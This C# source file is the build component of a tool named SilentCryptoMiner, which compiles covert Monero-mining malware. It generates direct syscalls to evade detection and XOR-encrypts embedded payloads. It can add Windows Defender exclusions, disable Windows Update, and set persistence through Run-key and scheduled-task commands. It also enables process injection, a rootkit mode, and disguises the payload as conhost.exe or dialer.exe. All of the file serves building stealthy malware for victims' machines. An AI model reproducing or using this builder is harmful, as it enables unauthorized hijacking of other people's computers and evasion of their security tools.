using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using Microsoft.CSharp;

namespace SilentCryptoMiner
{
    public class Codedom
    {
        public static Builder F;

        public static bool NativeCompiler(string savePath, string mainFileCode, string compilerCommand, string icoPath = "", bool assemblyData = false, bool requireAdministrator = false)
        {
            try
            {
                string currentDirectory = Path.GetDirectoryName(savePath);
                var paths = new Dictionary<string, string>() {
                    { "compilerbin",  Path.Combine(currentDirectory, @"UCompilers\gcc\bin\") },
                    { "windres",  Path.Combine(currentDirectory, @"UCompilers\gcc\bin\windres.exe") },
                    { "g++",  Path.Combine(currentDirectory, @"UCompilers\gcc\bin\g++.exe") },
                    { "syswhispersu",  Path.Combine(currentDirectory, @"UCompilers\SysWhispersU\SysWhispersU.exe") },
                    { "windreslog",  Path.Combine(currentDirectory, @"UCompilers\logs\windres.log") },
                    { "g++log",  Path.Combine(currentDirectory, @"UCompilers\logs\g++.log") },
                    { "syswhispersulog",  Path.Combine(currentDirectory, @"UCompilers\logs\SysWhispersU.log") },
                    { "manifest", Path.Combine(currentDirectory, "program.manifest") },
                    { "resource.rc", Path.Combine(currentDirectory, "resource.rc") },
                    { "resource.o", Path.Combine(currentDirectory, "resource.o") },
                    { "filename", Path.Combine(currentDirectory, Path.GetFileNameWithoutExtension(savePath)) }
                };

                if (F.BuildError(!F.txtStartDelay.Text.All(new Func<char, bool>(char.IsDigit)), "Error: Start Delay must be a number.")) return false;

                var resource = new StringBuilder(Properties.Resources.resource);
                string defs = "";
                if (!string.IsNullOrEmpty(icoPath))
                {
                    resource.Replace("#ICON", F.ToLiteral(icoPath));
                    defs += " -DDefIcon";
                }

                if (assemblyData)
                {
                    resource.Replace("#TITLE", F.ToLiteral(F.txtAssemblyTitle.Text));
                    resource.Replace("#DESCRIPTION", F.ToLiteral(F.txtAssemblyDescription.Text));
                    resource.Replace("#COMPANY", F.ToLiteral(F.txtAssemblyCompany.Text));
                    resource.Replace("#PRODUCT", F.ToLiteral(F.txtAssemblyProduct.Text));
                    resource.Replace("#COPYRIGHT", F.ToLiteral(F.txtAssemblyCopyright.Text));
                    resource.Replace("#TRADEMARK", F.ToLiteral(F.txtAssemblyTrademark.Text));
                    resource.Replace("#VERSION", string.Join(",", new string[] { 
                        SanitizeNumber(F.txtAssemblyVersion1.Text).ToString(), 
                        SanitizeNumber(F.txtAssemblyVersion2.Text).ToString(), 
                        SanitizeNumber(F.txtAssemblyVersion3.Text).ToString(), 
                        SanitizeNumber(F.txtAssemblyVersion4.Text).ToString()
                    }));
                    defs += " -DDefAssembly";
                }

                CreateManifest(paths["manifest"], requireAdministrator);

                File.WriteAllText(paths["resource.rc"], resource.ToString());
                RunExternalProgram($"windres.exe --input \"{(Path.Combine(currentDirectory, "resource.rc"))}\" --output \"{(Path.Combine(currentDirectory, "resource.o"))}\" -O coff --codepage=65001 {defs}", paths["compilerbin"], paths["windreslog"]);
                File.Delete(paths["resource.rc"]);
                File.Delete(paths["manifest"]);
                if (F.BuildError(!File.Exists(paths["resource.o"]), string.Format("Error: Failed at compiling resources, check the error log at {0}.", paths["windreslog"])))
                    return false;

                var maincode = new StringBuilder(mainFileCode);
                ReplaceGlobals(ref maincode);

                RunExternalProgram($"\"{paths["syswhispersu"]}\" -a x64 -l gas --function-prefix \"Ut\" -f NtSetInformationFile,NtSetInformationProcess,NtCreateFile,NtWriteFile,NtReadFile,NtDeleteFile,NtCreateSection,NtClose,NtMapViewOfSection,NtOpenFile,NtResumeThread,NtGetContextThread,NtSetContextThread,NtAllocateVirtualMemory,NtWriteVirtualMemory,NtFreeVirtualMemory,NtDelayExecution,NtOpenProcess,NtCreateUserProcess,NtOpenProcessToken,NtWaitForSingleObject,NtQueryAttributesFile,NtQueryInformationFile,NtCreateMutant,NtAdjustPrivilegesToken,NtQuerySystemInformation,NtQueryInformationToken,NtOpenKey,NtEnumerateKey,NtQueryValueKey,NtRenameKey -o \"{currentDirectory}\\UFiles\\Syscalls\\syscalls\"", currentDirectory, paths["syswhispersulog"]);
                File.WriteAllText(paths["filename"] + ".cpp", maincode.ToString());
                RunExternalProgram($"\"{paths["g++"]}\" " + compilerCommand, paths["compilerbin"], paths["g++log"]);
                File.Delete(paths["resource.o"]);
                File.Delete(paths["filename"] + ".cpp");
                if (F.BuildError(!File.Exists(paths["filename"] + ".exe"), string.Format("Error: Failed at compiling program, check the error log at {0}.", paths["g++log"])))
                    return false;

                if (F.FormAO.toggleRootkit.Checked)
                {
                    MakeRootkitHelper(savePath);
                }
                if(F.chkSignature.Checked && !string.IsNullOrEmpty(F.txtSignatureData.Text))
                {
                    F.WriteSignature(Convert.FromBase64String(F.txtSignatureData.Text), paths["filename"] + ".exe");
                }
            }
            catch (Exception ex)
            {
                F.BuildError(true, "Error: An error occured while compiling the file: " + ex.Message);
                return false;
            }
            return true;
        }

        public static bool CheckerCompiler(string savePath)
        {
            var providerOptions = new Dictionary<string, string>
            {
                { "CompilerVersion", "v4.0" }
            };
            var codeProvider = new CSharpCodeProvider(providerOptions);
            var parameters = new CompilerParameters
            {
                GenerateExecutable = true,
                OutputAssembly = savePath,
                CompilerOptions = " /target:exe /platform:x64 /optimize /win32manifest:\"" + savePath + ".manifest\"",
                IncludeDebugInformation = false,
                ReferencedAssemblies = { "System.dll", "System.Management.dll", "System.Core.dll" }
            };

            CreateManifest(savePath + ".manifest", F.toggleAdministrator.Checked);

            var checkerbuilder = new StringBuilder(Properties.Resources.Checker);
            ReplaceGlobals(ref checkerbuilder);
            var results = codeProvider.CompileAssemblyFromSource(parameters, checkerbuilder.ToString());

            try
            {
                File.Delete(savePath + ".manifest");
            }
            catch { }

            if (results.Errors.HasErrors)
            {
                foreach (CompilerError E in results.Errors)
                {
                    MessageBox.Show($"Line:  {E.Line}, Column: {E.Column}, Error message: {E.ErrorText}", "Build Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                return false;
            }

            if (F.FormAO.toggleRootkit.Checked)
            {
                MakeRootkitHelper(savePath);
            }
            return true;
        }

        public static bool UninstallerCompiler(string savePath)
        {
            var providerOptions = new Dictionary<string, string>
            {
                { "CompilerVersion", "v4.0" }
            };
            var codeProvider = new CSharpCodeProvider(providerOptions);
            var parameters = new CompilerParameters
            {
                GenerateExecutable = true,
                OutputAssembly = savePath,
                CompilerOptions = " /target:winexe /platform:x64 /optimize /win32manifest:\"" + savePath + ".manifest\"",
                IncludeDebugInformation = false,
                ReferencedAssemblies = { "System.dll", "System.Management.dll", "System.Core.dll" }
            };

            CreateManifest(savePath + ".manifest", F.toggleAdministrator.Checked);

            if (F.FormAO.toggleRootkit.Checked)
            {
                using (var R = new System.Resources.ResourceWriter("uninstaller.Resources"))
                {
                    R.AddResource("rootkit_u", Properties.Resources.Uninstall64);
                    R.Generate();
                }

                parameters.EmbeddedResources.Add("uninstaller.Resources");
            }

            var uninstallerbuilder = new StringBuilder(Properties.Resources.Uninstaller);
            ReplaceGlobals(ref uninstallerbuilder);
            var results = codeProvider.CompileAssemblyFromSource(parameters, uninstallerbuilder.ToString());

            try
            {
                File.Delete(savePath + ".manifest");
                File.Delete("uninstaller.Resources");
            }
            catch { }

            if (results.Errors.HasErrors)
            {
                foreach (CompilerError E in results.Errors)
                {
                    MessageBox.Show($"Line:  {E.Line}, Column: {E.Column}, Error message: {E.ErrorText}", "Build Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                return false;
            }

            if (F.FormAO.toggleRootkit.Checked)
            {
                MakeRootkitHelper(savePath);
            }
            return true;
        }

        public static void MakeRootkitHelper(string savePath)
        {
            byte[] newFile = File.ReadAllBytes(savePath);
            Buffer.BlockCopy(BitConverter.GetBytes(0x7268), 0, newFile, 64, 2);
            File.WriteAllBytes(savePath, newFile);
        }

        public static void RunExternalProgram(string arguments, string workingDirectory, string logpath)
        {
            using (Process process = new Process())
            {
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.Arguments = "/C set PATH=%cd%;%PATH% && " + arguments;
                process.StartInfo.WorkingDirectory = workingDirectory;
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardError = true;
                process.Start();

                using (StreamWriter writer = File.AppendText(logpath))
                {
                    writer.Write(process.StandardError.ReadToEnd());
                }
                process.WaitForExit();
            }
        }

        public static void CreateManifest(string path, bool administrator)
        {
            var mb = new StringBuilder(Properties.Resources.template);
            mb.Replace("#MANIFESTLEVEL", administrator ? "requireAdministrator" : "asInvoker");
            File.WriteAllText(path, mb.ToString());
        }

        public static void CreateResource(StringBuilder output, string name, byte[] data)
        {
            StringBuilder file = new StringBuilder();
            file.AppendLine($"long {name}Size = {data.Length};");
            file.AppendLine($"unsigned char {name}[{data.Length}] = {{ {(data.Length > 0 ? "0x" + BitConverter.ToString(Cipher(data, F.CipherKey)).Replace("-", ",0x") : "")} }};");
            File.WriteAllText(Path.Combine(Path.GetDirectoryName(F.savePath), $"UFiles\\{name}.h"), file.ToString(), Encoding.ASCII);
            output.AppendLine($"#include \"UFiles\\{name}.h\"");
        }

        public static byte[] Cipher(byte[] data, string key)
        {
            byte[] result = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
            {
                result[i] = (byte)(data[i] ^ key[i % key.Length]);
            }
            return result;
        }

        public static int SanitizeNumber(string input)
        {
            string sanitized = new string(input.Where(char.IsDigit).ToArray());
            return string.IsNullOrEmpty(sanitized) ? 0 : int.Parse(sanitized);
        }

        public static string ReplaceEscape(string input)
        {
            StringBuilder output = new StringBuilder(input);
            output.Replace(@"\", @"\\");
            output.Replace(@"""", @"\""");
            return output.ToString();
        }

        public static void ReplaceGlobals(ref StringBuilder stringb)
        {
            bool systemadmincheck = F.toggleRunSystem.Checked && F.toggleAdministrator.Checked;

            StringBuilder globalResources = new StringBuilder();

            if (F.xmrGPU)
            {
                stringb.Replace("DefGPULibs", "true");
            }

            if (F.mineXMR)
            {
                stringb.Replace("DefMineXMR", "true");
            }

            if (F.toggleWDExclusions.Checked)
            {
                stringb.Replace("DefWDExclusions", "true");
                stringb.Replace("#WDCOMMAND", $"Add-MpPreference -ExclusionPath @($env:UserProfile, $env:ProgramFiles) -Force");
            }

            if (F.FormAO.toggleRootkit.Checked)
            {
                stringb.Replace("DefRootkit", "true");
            }

            if (F.toggleDisableSleep.Checked)
            {
                stringb.Replace("DefDisableSleep", "true");
            }

            if (F.toggleWindowsUpdate.Checked)
            {
                stringb.Replace("DefDisableWindowsUpdate", "true");
            }

            if (F.toggleProcessProtect.Checked)
            {
                stringb.Replace("DefProcessProtect", "true");
            }

            if (F.chkBlockWebsites.Checked && !string.IsNullOrEmpty(F.txtBlockWebsites.Text))
            {
                stringb.Replace("DefBlockWebsites", "true");

                string[] domainList = F.txtBlockWebsites.Text.Split(',');
                stringb.Replace("$DOMAINSETSIZE", domainList.Length.ToString());
                stringb.Replace("$CSDOMAINSET", $"\" {string.Join("\", \" ", domainList)}\"");
                stringb.Replace("$CPPDOMAINSET", $"AYU_OBFUSCATE(\" {string.Join("\"), AYU_OBFUSCATE(\" ", domainList)}\")");
                stringb.Replace("$DOMAINSIZE", (F.txtBlockWebsites.Text.Replace("'", "").Length + domainList.Length*15).ToString());
            }

            if (int.Parse(F.txtStartDelay.Text) > 0)
            {
                stringb.Replace("DefStartDelay", "true");
                stringb.Replace("$STARTDELAY", F.txtStartDelay.Text + "000");
            }

            if (F.chkStartup.Checked)
            {
                stringb.Replace("DefStartup", "true");
                string installdir;
                string basedir;
                switch (F.Invoke(new Func<string>(() => F.txtStartupPath.Text)) ?? "")
                {
                    case "ProgramFiles":
                        {
                            installdir = "Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)";
                            basedir = "PROGRAMFILES=";
                            break;
                        }

                    case "UserProfile":
                        {
                            installdir = "Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)";
                            basedir = "USERPROFILE=";
                            break;
                        }

                    default:
                    case "AppData":
                        {
                            installdir = "Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)";
                            basedir = "APPDATA=";
                            break;
                        }
                }

                stringb.Replace("$BASEDIR", basedir);
                stringb.Replace("PayloadPath", $"System.IO.Path.Combine({installdir}, \"{F.ToLiteral(F.txtStartupFileName.Text)}\")");

                stringb.Replace("#STARTUPFILE", @"\\" + F.txtStartupFileName.Text.Replace(@"\", @"\\"));
                stringb.Replace("#TMPXML", $@"\\{F.Randomi(12, false)}.xml");

                CreateResource(globalResources, "resTaskTemplate", Encoding.UTF8.GetBytes(Properties.Resources.TaskTemplate.Replace("#STARTUPPATH", $"%{F.Invoke(new Func<string>(() => F.txtStartupPath.Text))}%\\{F.Invoke(new Func<string>(() => F.txtStartupFileName.Text))}").Replace("#STARTUPTRIGGER", systemadmincheck ? "BootTrigger" : "LogonTrigger")));

                if (F.toggleWatchdog.Checked)
                {
                    stringb.Replace("DefWatchdog", "true");
                }

                if (F.toggleAutoDelete.Checked)
                {
                    stringb.Replace("DefAutoDelete", "true");
                }

                if (F.FormAO.toggleRunInstall.Checked)
                {
                    stringb.Replace("DefRunInstall", "true");
                }
            }

            stringb.Replace("$CSLIBSROOT", F.chkStartup.Checked && systemadmincheck ? "Environment.SpecialFolder.ProgramFiles" : "Environment.SpecialFolder.ApplicationData");
            stringb.Replace("$CPPLIBSROOT", F.chkStartup.Checked && systemadmincheck ? "PROGRAMFILES=" : "APPDATA=");

            stringb.Replace("$CHECKERSET", string.Join(", ", F.checkerSet));
            stringb.Replace("$MUTEXSET", string.Join(", ", F.mutexSet));
            stringb.Replace("$INJECTIONTARGETS", "\"" + string.Join("\", \"", F.injectionTargets.Distinct().ToList()) + "\"");

            stringb.Replace("#WATCHDOGID", F.watchdogID);
            stringb.Replace("#MUTEXMINER", F.Randomi(24, false));

            stringb.Replace("#STARTUPADDUSER", ReplaceEscape($"add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"{F.txtStartupEntryName.Text}\" /t REG_SZ /f /d \"%S\""));
            stringb.Replace("#STARTUPADDADMIN", ReplaceEscape($"/create /f {(systemadmincheck ? "/ru \"System\"" : "")} /tn \"{F.txtStartupEntryName.Text.Replace("\"", "\"\"")}\" /xml \"%S\""));
            stringb.Replace("#STARTUPREMOVEUSER", ReplaceEscape($"delete \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"{F.txtStartupEntryName.Text}\" /f"));
            stringb.Replace("#STARTUPREMOVEADMIN", ReplaceEscape($"/delete /f /tn \"{F.txtStartupEntryName.Text.Replace("\"", "\"\"")}\""));
            stringb.Replace("#STARTUPSTARTADMIN", ReplaceEscape($"/run /tn \"{F.txtStartupEntryName.Text}\""));

            stringb.Replace("#STARTUPENTRYNAME", ReplaceEscape(F.txtStartupEntryName.Text));
            
            stringb.Replace("#CONHOSTPATH", F.FormAO.toggleRootkit.Checked ? @"\\dialer.exe" : @"\\conhost.exe");

            stringb.Replace("#TMPNAME", $@"\\{F.Randomi(12, false)}.tmp");
            stringb.Replace("#WINRINGNAME", F.winringName);

            stringb.Replace("$GLOBALRESOURCES", globalResources.ToString());
        }
    }
}